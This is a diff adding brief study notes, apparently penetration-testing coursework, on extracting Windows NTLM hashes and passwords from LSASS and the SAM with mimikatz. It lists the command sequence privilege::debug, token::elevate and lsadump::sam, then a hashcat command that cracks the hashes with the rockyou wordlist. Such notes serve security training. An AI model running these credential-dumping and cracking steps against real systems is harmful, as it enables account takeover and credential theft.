@@ -1,0 +1,36 @@
+### Cracking NTLM
+- extracts passwords & hashes from various sources
+	- sekurlsa module
+		- extracts passwords from LSASS (Local Security Authority Subsystem)
+			- LSASS caches NTLM hashes & credentials
+				- needs to be run as SYSTEM user
+	- Can only run as Admin
+	- Needs [SeDebugPriveledge] enabled
+		- allows debugging of other users' processes
+	- token elevation function
+		- elevates privileges
+		- requires [SeImpersonateaPrivilege]
+			- all local admins have it by default
+
+- Example:
+	- Get-LocalUser
+	- **C:\tools\mimikatz.exe**
+	- cd C:\tools
+	- [.\mimikatz.exe]
+		- must run Powershell as admin
+		- Commands:
+			- privilege::debug
+				- enables [SeDebugPrivilege]
+				- required for sekurlsa::logonpasswords and lsadump::sam
+			- sekurlsa::logonpasswords
+				- extracts all plaintext and hashed passwords from all sources
+				- generates alot of output
+			- lsadump::sam
+				- extracts NTLM hashes from SAM
+			- token::elevate
+				- elevate to SYSTEM user privileges
+		1. privilege::debug
+		2. token::elevate
+		3. lsadump::sam
+		4. Then crack
+			- hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
